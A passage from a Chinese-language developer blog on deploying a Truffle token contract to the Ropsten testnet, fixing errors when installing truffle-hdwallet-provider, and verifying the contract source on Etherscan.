class="line">   &gt; account:             0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65</span><br><span class="line">   &gt; balance:             1.96577714</span><br><span class="line">   &gt; gas used:            1421673</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.02843346 ETH</span><br><span class="line"></span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.02843346 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Summary</span><br><span class="line">=======</span><br><span class="line">&gt; Total deployments:   2</span><br><span class="line">&gt; Final cost:          0.0336827 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting migrations...</span><br><span class="line">======================</span><br><span class="line">&gt; Network name:    <span class="string">'ropsten'</span></span><br><span class="line">&gt; Network id:      3</span><br><span class="line">&gt; Block gas <span class="built_in">limit</span>: 0x7a1200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1_initial_migration.js</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">   Deploying <span class="string">'Migrations'</span></span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; transaction <span class="built_in">hash</span>:    0xcb0b58dc9e78627a5c703c605372d95a21a38d477223a34cb50674e67a035f95</span><br><span class="line">   &gt; Blocks: 1            Seconds: 12</span><br><span class="line">   &gt; contract address:    0x43A01b6F8f49906f29F12af26572c341b9720719</span><br><span class="line">   &gt; block number:        5878879</span><br><span class="line">   &gt; block timestamp:     1561706995</span><br><span class="line">   &gt; account:             0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65</span><br><span class="line">   &gt; balance:             1.99445076</span><br><span class="line">   &gt; gas used:            277462</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00554924 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00554924 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2_deploy_contracts.js</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">   Deploying <span class="string">'VToken'</span></span><br><span class="line">   ------------------</span><br><span class="line">   &gt; transaction <span class="built_in">hash</span>:    0x877fd23aeec91a37c076bee389e13563ffa67398a6c264ae9760033f897d080f</span><br><span class="line">   &gt; Blocks: 1            Seconds: 22</span><br><span class="line">   &gt; contract address:    0xe834bB279e791f3Bb6b9c20C04Ee7cdEb4b79308</span><br><span class="line">   &gt; block number:        5878886</span><br><span class="line">   &gt; block timestamp:     1561707091</span><br><span class="line">   &gt; account:             0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65</span><br><span class="line">   &gt; balance:             1.96337714</span><br><span class="line">   &gt; gas used:            1511673</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.03023346 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.03023346 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Summary</span><br><span class="line">=======</span><br><span class="line">&gt; Total deployments:   2</span><br><span class="line">&gt; Final cost:          0.0357827 ETH</span><br><span class="line"></span><br><span class="line">samwen@samwen-ubuntu:~/VToken$</span><br></pre></td></tr></table></figure></p>
<h3 id="查看部署成果"><a href="#查看部署成果" class="headerlink" title="查看部署成果"></a>查看部署成果</h3><p>先看下账号下发生了什么交易，通过 <code>https://ropsten.etherscan.io/address/账号地址</code> 来访问 。<br>这是本次部署： <a href="https://ropsten.etherscan.io/address/0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65" target="_blank" rel="noopener">0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65</a></p>
<p>一共有四笔交易，两份合约，就是我们执行的。</p>
<p><img src="/images/blockchain/8部署交易记录.png" alt></p>
<p><a href="https://ropsten.etherscan.io/address/0xe834bB279e791f3Bb6b9c20C04Ee7cdEb4b79308" target="_blank" rel="noopener">合约地址： 0xe834bB279e791f3Bb6b9c20C04Ee7cdEb4b79308</a> </p>
<p>通过网页可以看到还需要我们上传源代码，此处由于依赖到 <code>OpenZeppelin</code> ，结果上传几次都编译失败（Remix编译没问题），先不管了。</p>
<p><img src="/images/blockchain/8部署之后的合约.png" alt></p>
<h3 id="常见错误问题"><a href="#常见错误问题" class="headerlink" title="常见错误问题"></a>常见错误问题</h3><ol>
<li><p>部署的账号没有ETH余额</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@samwen-ubuntu:~/VToken$ truffle deploy --reset --network ropsten</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Everything is up to date, there is nothing to compile.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting migrations...</span><br><span class="line">======================</span><br><span class="line">&gt; Network name:    <span class="string">'ropsten'</span></span><br><span class="line">&gt; Network id:      3</span><br><span class="line">&gt; Block gas <span class="built_in">limit</span>: 0x7a1200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1_initial_migration.js</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">   Deploying <span class="string">'Migrations'</span></span><br><span class="line">   ----------------------</span><br><span class="line">Error: Error: Error:  *** Deployment Failed ***</span><br><span class="line"></span><br><span class="line"><span class="string">"Migrations"</span> could not deploy due to insufficient funds</span><br><span class="line">   * Account:  0xA495032Bf8c02cC4594a40F53AC5A38555728107</span><br><span class="line">   * Balance:  0 wei</span><br><span class="line">   * Message:  insufficient funds <span class="keyword">for</span> gas * price + value</span><br><span class="line">   * Message:  sender doesn<span class="string">'t have enough funds to send tx. The upfront cost is: 134439500000000000 and the sender'</span>s account only has: 0</span><br><span class="line">   * Try:</span><br><span class="line">      + Using an adequately funded account</span><br><span class="line">      + If you are using a <span class="built_in">local</span> Geth node, verify that your node is synced.</span><br><span class="line"></span><br><span class="line">    at Object.run (/usr/<span class="built_in">local</span>/lib/node_modules/truffle/build/webpack:/packages/truffle-migrate/index.js:92:1)</span><br><span class="line">    at process._tickCallback (internal/process/next_tick.js:68:7)</span><br><span class="line">Truffle v5.0.24 (core: 5.0.24)</span><br><span class="line">Node v10.16.0</span><br></pre></td></tr></table></figure>
<p><code>could not deploy due to insufficient funds</code> : 因资金不足无法部署</p>
</li>
<li><p>gas设置太高</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">===========================</span><br><span class="line">&gt; Everything is up to date, there is nothing to compile.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Migrations dry-run (simulation)</span><br><span class="line">===============================</span><br><span class="line">&gt; Network name:    <span class="string">'ropsten-fork'</span></span><br><span class="line">&gt; Network id:      3</span><br><span class="line">&gt; Block gas <span class="built_in">limit</span>: 0x7a1200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1_initial_migration.js</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">   Deploying <span class="string">'Migrations'</span></span><br><span class="line">   ----------------------</span><br><span class="line">Error: Error: Error:  *** Deployment Failed ***</span><br><span class="line"></span><br><span class="line"><span class="string">"Migrations"</span> exceeded the block <span class="built_in">limit</span> (with a gas value you <span class="built_in">set</span>).</span><br><span class="line">   * Block <span class="built_in">limit</span>:  0x203c3f0</span><br><span class="line">   * Gas sent:     11118500000</span><br><span class="line">   * Try:</span><br><span class="line">      + Sending less gas.</span><br><span class="line">      + Setting a higher network block <span class="built_in">limit</span> <span class="keyword">if</span> you are on a</span><br><span class="line">        private network or <span class="built_in">test</span> client (like ganache).</span><br><span class="line"></span><br><span class="line">    at Object.run (/usr/<span class="built_in">local</span>/lib/node_modules/truffle/build/webpack:/packages/truffle-migrate/index.js:92:1)</span><br><span class="line">    at process._tickCallback (internal/process/next_tick.js:68:7)</span><br><span class="line">Truffle v5.0.24 (core: 5.0.24)</span><br><span class="line">Node v10.16.0</span><br></pre></td></tr></table></figure>
<p>超过block限制(使用您设置的 gas 值)，把gas的值改小。</p>
</li>
</ol>
<h3 id="hdwallet安装问题"><a href="#hdwallet安装问题" class="headerlink" title="hdwallet安装问题"></a>hdwallet安装问题</h3><div style="color: red"><br><strong>最新解决办法20200114记录(Ubuntu)</strong><br><strong>最新解决办法20200114记录(Ubuntu)</strong><br><strong>最新解决办法20200114记录(Ubuntu)</strong><br></div>

<ol>
<li>这是npm一个普遍的权限问题，尽量不要以root账号身份安装此依赖（普通账号也不要加sudo）</li>
<li>如果一定要用root身份，在命令后加参数 <code>--allow-root</code></li>
<li>最好是普通账号执行 <code>npm install truffle-hdwallet-provider --unsafe-perm=true</code></li>
<li>root账号执行  <code>npm install truffle-hdwallet-provider --unsafe-perm=true --allow-root</code></li>
</ol>
<p><div style="color: red"><br><strong>早期手动修改的办法，已不建议使用</strong><br></div><br>在Windows10系统中安装hdwallet一样会提示缺少C++组件：<br><code>MSBUILD : error MSB3428: 未能加载 Visual C++ 组件“VCBuild.exe”。要解决此问题，1) 安装 .NET Framework 2.0 SDK；</code><br>一般通过管理员启动一个终端，执行<code>$ npm install -g windows-build-tools</code> 会安装好C++依赖，但是我的Windows10安装不了这个软件，手动下载MSBuild.exe也是无法安装，打开就闪退。</p>
<p>所以，这里只记录一下在Ubuntu下的解决日志。</p>
<blockquote>
<p>如果想尽快使用，可以下载我在Ubuntu下打包的 node_modules： <a href="https://share.weiyun.com/5fscwl8" target="_blank" rel="noopener">https://share.weiyun.com/5fscwl8</a></p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先确认已安装C++编译环境</span></span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ sudo apt-get install build-essential</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">build-essential is already the newest version (12.4ubuntu1).</span><br><span class="line">0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ sudo npm install truffle-hdwallet-provider</span><br><span class="line">npm WARN deprecated tar.gz@1.0.7: ⚠️  WARNING ⚠️ tar.gz module has been deprecated and your application is vulnerable. Please use tar module instead: https://npmjs.com/tar</span><br><span class="line"></span><br><span class="line">&gt; scrypt@6.0.3 preinstall /home/samwen/VToken/node_modules/scrypt</span><br><span class="line">&gt; node node-scrypt-preinstall.js</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; scrypt@6.0.3 install /home/samwen/VToken/node_modules/scrypt</span><br><span class="line">&gt; node-gyp rebuild</span><br><span class="line"></span><br><span class="line">gyp ERR! configure error </span><br><span class="line">gyp ERR! stack Error: EACCES: permission denied, mkdir <span class="string">'/home/samwen/VToken/node_modules/scrypt/build'</span></span><br><span class="line">gyp ERR! System Linux 4.15.0-20-generic</span><br><span class="line">gyp ERR! <span class="built_in">command</span> <span class="string">"/usr/local/bin/node"</span> <span class="string">"/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js"</span> <span class="string">"rebuild"</span></span><br><span class="line">gyp ERR! cwd /home/samwen/VToken/node_modules/scrypt</span><br><span class="line">gyp ERR! node -v v10.16.0</span><br><span class="line">gyp ERR! node-gyp -v v3.8.0</span><br><span class="line">gyp ERR! not ok </span><br><span class="line">npm WARN VToken@1.0.0 No repository field.</span><br><span class="line">npm WARN VToken@1.0.0 No license field.</span><br><span class="line"></span><br><span class="line">npm ERR! code ELIFECYCLE</span><br><span class="line">npm ERR! errno 1</span><br><span class="line">npm ERR! scrypt@6.0.3 install: `node-gyp rebuild`</span><br><span class="line">npm ERR! Exit status 1</span><br><span class="line">npm ERR! </span><br><span class="line">npm ERR! Failed at the scrypt@6.0.3 install script.</span><br><span class="line">npm ERR! This is probably not a problem with npm. There is likely additional logging output above.</span><br><span class="line"></span><br><span class="line">npm ERR! A complete <span class="built_in">log</span> of this run can be found <span class="keyword">in</span>:</span><br><span class="line">npm ERR!     /home/samwen/.npm/_logs/2019-06-28T05_50_58_642Z-debug.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误提示没有权限创建目录，手动创建目录</span></span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ sudo mkdir -p /home/samwen/VToken/node_modules/scrypt/build</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ sudo chmod -R 777  /home/samwen/VToken/node_modules/scrypt/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新运行安装一次</span></span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ sudo npm install truffle-hdwallet-provider</span><br><span class="line">npm WARN deprecated fs-promise@2.0.3: Use mz or fs-extra^3.0 with Promise Support</span><br><span class="line">npm WARN deprecated tar.gz@1.0.7: ⚠️  WARNING ⚠️ tar.gz module has been deprecated and your application is vulnerable. Please use tar module instead: https://npmjs.com/tar</span><br><span class="line">npm ERR! path /home/samwen/VToken/node_modules/web3-providers-ws/node_modules/websocket</span><br><span class="line">npm ERR! code EISGIT</span><br><span class="line">npm ERR! git /home/samwen/VToken/node_modules/web3-providers-ws/node_modules/websocket: Appears to be a git repo or submodule.</span><br><span class="line">npm ERR! git     /home/samwen/VToken/node_modules/web3-providers-ws/node_modules/websocket</span><br><span class="line">npm ERR! git Refusing to remove it. Update manually,</span><br><span class="line">npm ERR! git or move it out of the way first.</span><br><span class="line"></span><br><span class="line">npm ERR! A complete <span class="built_in">log</span> of this run can be found <span class="keyword">in</span>:</span><br><span class="line">npm ERR!     /home/samwen/.npm/_logs/2019-06-28T05_58_55_864Z-debug.log</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ </span><br><span class="line"><span class="comment"># 提示websocket下有 'git repo or submodule'，手动删除 '.git'</span></span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ sudo rm -rf node_modules/web3-providers-ws/node_modules/websocket/.git</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ sudo npm install truffle-hdwallet-provider</span><br><span class="line">npm WARN deprecated fs-promise@2.0.3: Use mz or fs-extra^3.0 with Promise Support</span><br><span class="line">npm WARN deprecated tar.gz@1.0.7: ⚠️  WARNING ⚠️ tar.gz module has been deprecated and your application is vulnerable. Please use tar module instead: https://npmjs.com/tar</span><br><span class="line"></span><br><span class="line">&gt; scrypt@6.0.3 preinstall /home/samwen/VToken/node_modules/scrypt</span><br><span class="line">&gt; node node-scrypt-preinstall.js</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; scrypt@6.0.3 install /home/samwen/VToken/node_modules/scrypt</span><br><span class="line">&gt; node-gyp rebuild</span><br><span class="line"></span><br><span class="line">gyp ERR! configure error </span><br><span class="line">gyp ERR! stack Error: EACCES: permission denied, mkdir <span class="string">'/home/samwen/VToken/node_modules/scrypt/build'</span></span><br><span class="line">gyp ERR! System Linux 4.15.0-20-generic</span><br><span class="line">gyp ERR! <span class="built_in">command</span> <span class="string">"/usr/local/bin/node"</span> <span class="string">"/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js"</span> <span class="string">"rebuild"</span></span><br><span class="line">gyp ERR! cwd /home/samwen/VToken/node_modules/scrypt</span><br><span class="line">gyp ERR! node -v v10.16.0</span><br><span class="line">gyp ERR! node-gyp -v v3.8.0</span><br><span class="line">gyp ERR! not ok </span><br><span class="line">npm WARN VToken@1.0.0 No repository field.</span><br><span class="line">npm WARN VToken@1.0.0 No license field.</span><br><span class="line"></span><br><span class="line">npm ERR! code ELIFECYCLE</span><br><span class="line">npm ERR! errno 1</span><br><span class="line">npm ERR! scrypt@6.0.3 install: `node-gyp rebuild`</span><br><span class="line">npm ERR! Exit status 1</span><br><span class="line">npm ERR! </span><br><span class="line">npm ERR! Failed at the scrypt@6.0.3 install script.</span><br><span class="line">npm ERR! This is probably not a problem with npm. There is likely additional logging output above.</span><br><span class="line"></span><br><span class="line">npm ERR! A complete <span class="built_in">log</span> of this run can be found <span class="keyword">in</span>:</span><br><span class="line">npm ERR!     /home/samwen/.npm/_logs/2019-06-28T06_10_26_806Z-debug.log</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ node-gyp rebuild</span><br><span class="line">internal/modules/cjs/loader.js:638</span><br><span class="line">    throw err;</span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">Error: Cannot find module <span class="string">'graceful-fs'</span></span><br><span class="line">    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:636:15)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:562:25)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:690:17)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:25:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/usr/share/node-gyp/lib/node-gyp.js:12:10)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:776:30)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:787:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:653:32)</span><br><span class="line">    at tryModuleLoad (internal/modules/cjs/loader.js:593:12)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:585:3)</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$</span><br><span class="line"><span class="comment"># 切换到root账号执行，就没有权限问题了。</span></span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ sudo su root</span><br><span class="line">root@samwen-ubuntu:/home/samwen/VToken<span class="comment"># sudo npm install truffle-hdwallet-provider</span></span><br><span class="line">npm WARN deprecated fs-promise@2.0.3: Use mz or fs-extra^3.0 with Promise Support</span><br><span class="line">npm WARN deprecated tar.gz@1.0.7: ⚠️  WARNING ⚠️ tar.gz module has been deprecated and your application is vulnerable. Please use tar module instead: https://npmjs.com/tar</span><br><span class="line"></span><br><span class="line">&gt; scrypt@6.0.3 preinstall /home/samwen/VToken/node_modules/scrypt</span><br><span class="line">&gt; node node-scrypt-preinstall.js</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; scrypt@6.0.3 install /home/samwen/VToken/node_modules/scrypt</span><br><span class="line">&gt; node-gyp rebuild</span><br><span class="line"></span><br><span class="line">make: Entering directory <span class="string">'/home/samwen/VToken/node_modules/scrypt/build'</span></span><br><span class="line">  SOLINK_MODULE(target) Release/obj.target/copied_files.node</span><br><span class="line">  COPY Release/copied_files.node</span><br><span class="line">  CC(target) Release/obj.target/scrypt_wrapper/src/util/memlimit.o</span><br><span class="line">  CC(target) Release/obj.target/scrypt_wrapper/src/scryptwrapper/keyderivation.o</span><br><span class="line">  CC(target) Release/obj.target/scrypt_wrapper/src/scryptwrapper/pickparams.o</span><br><span class="line">  CC(target) Release/obj.target/scrypt_wrapper/src/scryptwrapper/hash.o</span><br><span class="line">  AR(target) Release/obj.target/scrypt_wrapper.a</span><br><span class="line">  COPY Release/scrypt_wrapper.a</span><br><span class="line">  CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/lib/crypto/crypto_scrypt.o</span><br><span class="line">  CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/lib/crypto/crypto_scrypt_smix.o</span><br><span class="line">  CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/libcperciva/util/warnp.o</span><br><span class="line">  CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/libcperciva/alg/sha256.o</span><br><span class="line">  CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/libcperciva/util/insecure_memzero.o</span><br><span class="line">  CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/lib/scryptenc/scryptenc_cpuperf.o</span><br><span class="line">  AR(target) Release/obj.target/scrypt_lib.a</span><br><span class="line">  COPY Release/scrypt_lib.a</span><br><span class="line">  CXX(target) Release/obj.target/scrypt/src/node-boilerplate/scrypt_common.o</span><br><span class="line">  CXX(target) Release/obj.target/scrypt/src/node-boilerplate/scrypt_params_async.o</span><br><span class="line">In file included from ../src/node-boilerplate/inc/scrypt_async.h:28:0,</span><br><span class="line">                 from ../src/node-boilerplate/inc/scrypt_params_async.h:28,</span><br><span class="line">                 from ../src/node-boilerplate/scrypt_params_async.cc:4:</span><br><span class="line">../src/node-boilerplate/inc/scrypt_common.h: In constructor ‘NodeScrypt::Params::Params(const v8::Local&lt;v8::Object&gt;&amp;)’:</span><br><span class="line">../src/node-boilerplate/inc/scrypt_common.h:39:63: warning: ‘uint32_t v8::Value::Uint32Value() const’ is deprecated: Use maybe version [-Wdeprecated-declarations]</span><br><span class="line">       N(obj-&gt;Get(Nan::New(<span class="string">"N"</span>).ToLocalChecked())-&gt;Uint32Value()),</span><br><span class="line">                                                               ^</span><br><span class="line">In file included from /root/.node-gyp/10.16.0/include/node/v8.h:26:0,</span><br><span class="line">                 from /root/.node-gyp/10.16.0/include/node/node.h:63,</span><br><span class="line">                 from ../../nan/nan.h:53,</span><br><span class="line">                 from ../src/node-boilerplate/scrypt_params_async.cc:1:</span><br><span class="line">/root/.node-gyp/10.16.0/include/node/v8.h:2477:47: note: declared here</span><br><span class="line">   V8_DEPRECATED(<span class="string">"Use maybe version"</span>, uint32_t Uint32Value() const);</span><br><span class="line">                                               ^</span><br><span class="line">/root/.node-gyp/10.16.0/include/node/v8config.h:324:3: note: <span class="keyword">in</span> definition of macro ‘V8_DEPRECATED’</span><br><span class="line">   declarator __attribute__((deprecated(message)))</span><br><span class="line">   ^~~~~~~~~~</span><br><span class="line">很多node-gyp日志</span><br><span class="line">很多node-gyp日志</span><br><span class="line">很多node-gyp日志</span><br><span class="line"></span><br><span class="line">  CXX(target) Release/obj.target/scrypt/scrypt_node.o</span><br><span class="line">  SOLINK_MODULE(target) Release/obj.target/scrypt.node</span><br><span class="line">  COPY Release/scrypt.node</span><br><span class="line">make: Leaving directory <span class="string">'/home/samwen/VToken/node_modules/scrypt/build'</span></span><br><span class="line">npm WARN VToken@1.0.0 No repository field.</span><br><span class="line">npm WARN VToken@1.0.0 No license field.</span><br><span class="line"></span><br><span class="line">+ truffle-hdwallet-provider@1.0.11</span><br><span class="line">added 8 packages from 8 contributors and audited 112619 packages <span class="keyword">in</span> 60.524s</span><br><span class="line">found 0 vulnerabilities</span><br><span class="line"></span><br><span class="line">root@samwen-ubuntu:/home/samwen/VToken<span class="comment"># </span></span><br><span class="line"><span class="comment"># 终于没报错了</span></span><br><span class="line">root@samwen-ubuntu:/home/samwen/VToken<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ cat package.json </span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"VToken"</span>,</span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="string">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="string">"truffle-hdwallet-provider"</span>: <span class="string">"^1.0.11"</span>,</span><br><span class="line">    <span class="string">"zeppelin-solidity"</span>: <span class="string">"^1.12.0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># truffle-hdwallet-provider 已安装成功</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>8.3、验证发布到Ropsten网络的智能合约</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/8.3%E3%80%81%E9%AA%8C%E8%AF%81%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</url>
    <content><![CDATA[<h2 id="为什么要验证合约？"><a href="#为什么要验证合约？" class="headerlink" title="为什么要验证合约？"></a>为什么要验证合约？</h2><p>源代码验证为与智能合约交互的用户提供了透明性。通过上传源代码，Etherscan将编译后的代码与区块链上的代码匹配。就像合同一样，“智能合约”应该为最终用户提供更多关于他们“数字签名”的信息，并让用户有机会审计代码，以独立地验证代码实际上做了应该做的事情。</p>
<blockquote>
<p>ABI文件公开？目前我的Dapp做法需要将编译的合约 json 文件和WebApp放在一起，通过ajax读取 json 文件初始化合约。</p>
</blockquote>
<h2 id="如何验证？"><a href="#如何验证？" class="headerlink" title="如何验证？"></a>如何验证？</h2><p>具体就是将代码上传到<a href="etherscan.io">etherscan.io</a>，只需几步操作。</p>
<p>在 Etherscan 上打开你的合约地址： <code>https://ropsten.etherscan.io/address/{合约地址}#contracts</code></p>
<p><img src="/images/blockchain/验证合约1.png" alt><br><img src="/images/blockchain/验证合约2.png" alt><br><img src="/images/blockchain/验证合约3.png" alt><br><img src="/images/blockchain/验证合约4.png" alt></p>
<p>但是，我每次面对的都是500错误，被搞的抓狂。</p>
<p><img src="/images/blockchain/验证合约5.png" alt></p>
<h2 id="坑坑"><a href="#坑坑" class="headerlink" title="坑坑"></a>坑坑</h2><ol>
<li>网上很多文章说Etherscan 不支持import，那是因为老版本<a href="https://ropsten.etherscan.io/verifyContract2" target="_blank" rel="noopener">verifyContract2</a>的原因，现在<a href="https://ropsten.etherscan.io/verifyContract" target="_blank" rel="noopener">verifyContract</a>是支持import的,选择多文件上传即可。</li>
<li>单文件HelloWorld合约提交也是500错误（这个最坑）</li>
</ol>
<h2 id="错误500的原因"><a href="#错误500的原因" class="headerlink" title="错误500的原因"></a>错误500的原因</h2><p>合约提交500错误很烦，尝试了各种方法，网上说要用VPN，VPN也用上了，但是无奈当时是因为此VPN出了点状况，没能上Google。</p>
<p><strong> 这个500错误就是网络的问题，正确的判断是“提交的页面”有没有出现“人机身份验证”。</strong></p>
<p>查看了一下Chrome的网络，可以看到有一个js文件请求失败了，这就是Google的“人机身份验证”。（坑：加载失败了没提示错误？？？没通过“人机身份验证”提示报错？？？）</p>
<p><img src="/images/blockchain/验证合约6.png" alt></p>
<h2 id="成功爬坑"><a href="#成功爬坑" class="headerlink" title="成功爬坑"></a>成功爬坑</h2><ol>
<li>首先要用VPN科学上网，确认能上Google</li>
<li>在提交代码页面确认出现了“人机身份验证”</li>
<li>正常提交就OK了。</li>
</ol>
<p>下面是用HelloWorld合约测试的结果：</p>
<p><img src="/images/blockchain/验证合约7-成功加载页面.png" alt="成功加载页面"><br><img src="/images/blockchain/验证合约8-通过人机校验.png" alt="通过人机校验"><br><img src="/images/blockchain/验证合约9-验证成功.png" alt="验证成功"><br><img src="/images/blockchain/验证合约10-查看验证通过的合约.png" alt="查看验证通过的合约"></p>
<h2 id="合并工具"><a href="#合并工具" class="headerlink" title="合并工具"></a>合并工具</h2><p>如果依赖一些第三方库，而合约文件比较多，可以利用合并工具进行合并为单一文件。同时现在也是支持多文件和imports的。</p>
<h5 id="1-SolidityFlattery"><a href="#1-SolidityFlattery" class="headerlink" title="1. SolidityFlattery"></a>1. <a href="https://github.com/akombalabs/SolidityFlattery" target="_blank" rel="noopener">SolidityFlattery</a></h5><p>这是Golang写的工具，直接下载 github 中 <code>flat</code> 可执行文件，丢在 <code>/usr/bin</code> 目录就可以使用了</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ flat -input MetaCoin.sol -output SourceCode</span><br></pre></td></tr></table></figure>
<h5 id="2-solidity-flattener"><a href="#2-solidity-flattener" class="headerlink" title="2. solidity-flattener"></a>2. <a href="https://github.com/BlockCatIO/solidity-flattener" target="_blank" rel="noopener">solidity-flattener</a></h5><p>这个是Python3写的工具，依赖Python。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pip3 install solidity-flattener</span><br><span class="line">$ solidity_flattener –output SourceCode.sol MetaCoin.sol</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>以下是参考的资料和摘录</p>
<ul>
<li><a href="https://cloud.tencent.com/developer/article/1413381" target="_blank" rel="noopener">《如何在Etherscan中支持合约接口调用》</a><blockquote>
<p>实现步骤</p>
<ol>
<li>合并合约：将所有import导入的合约和库（library）都写到一个文件中</li>
<li>验证合约：进入verify contract页面，指定已部署合约地址和名称</li>
<li>编译合约：选择Compiler版本和优化方案<br>第一步比较繁琐，如果你使用了open-zeppelin之类的通用库，需要翻翻好多个目录才能把依赖的合约凑齐并放置在一个文件当中，而且特别要注意加上版本宏定义pragma solidity ^0.5.0;。</li>
</ol>
</blockquote>
</li>
</ul>
<ul>
<li><p><a href="https://uzzz.org/2018/02/13/924cb7f660caab962ebbecf6d1bf03ac.html" target="_blank" rel="noopener">《如何发布你自己的 ICO》</a></p>
<blockquote>
<p>在填写表单时有以下注意事项:</p>
<ol>
<li>Compiler 选择最新版本</li>
<li>Optimization 选择 No</li>
</ol>
<p>虽然 solidity 支持 import 语法，但 Etherscan 对使用 import 进行开发的合约支持很鸡肋，目前它要求你需要把库文件也当作合约发布至网络才能够在表单中填写进行验证。<br>当然我们也可以选择手动把 import 库文件的内容手动复制粘贴到代码框里，注意要保留全部内容，包括 pragma 声明一行。</p>
</blockquote>
</li>
<li><p><a href="https://www.jianshu.com/p/e2763ef9fcb0" target="_blank" rel="noopener">《验证ETH智能合约》</a></p>
<blockquote>
<p>利用 <a href="https://github.com/akombalabs/SolidityFlattery" target="_blank" rel="noopener">SolidityFlattery</a> 工具来删除 import 和合并合约</p>
</blockquote>
</li>
<li><a href="https://docs.ethlinker.com/faq/token/verify_etherscan.html?q=" target="_blank" rel="noopener">《如何在Etherscan验证代币合约》</a><blockquote>
<p>验证需要科学上网，否则会因网络问题造成验证失败</p>
</blockquote>
</li>
